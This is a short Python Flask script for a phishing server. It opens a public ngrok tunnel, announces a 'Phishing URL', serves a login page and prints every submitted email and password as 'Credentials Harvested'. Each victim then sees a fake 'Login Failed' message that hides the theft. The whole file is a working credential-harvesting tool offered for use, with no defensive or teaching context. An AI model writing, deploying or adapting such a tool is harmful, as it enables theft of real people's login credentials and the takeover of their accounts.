from flask import Flask, request, render_template
from pyngrok import ngrok

app = Flask(__name__)

# Start Ngrok tunnel
public_url = ngrok.connect(5000).public_url
print(f"[*] Phishing URL: {public_url}/")

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    email = request.form['email']
    password = request.form['password']
    print(f"[!] Credentials Harvested: {email} : {password}")
    return "Login Failed. Contact Support."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)  # Allows external access